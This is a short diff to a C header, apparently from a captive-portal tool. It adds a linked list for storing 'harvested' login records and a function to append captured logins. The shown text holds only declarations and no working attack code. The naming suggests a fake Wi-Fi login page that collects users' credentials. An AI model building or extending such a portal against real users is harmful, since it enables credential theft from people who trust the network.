@@ -21,8 +21,18 @@ typedef struct {
     bool valid;
 } login_data_t;
 
+// node def 
+typedef struct ListNode {
+    login_data_t data;
+    struct ListNode *next;
+} ListNode;
+
+// global head of the list
+extern ListNode *harvested_data_head;
+
 // expose main function
 void captive_portal_main(void);
 void stop_captive_portal(void);
 login_data_t get_captured_login(void);
+void add_login_to_list(login_data_t new_data);
 
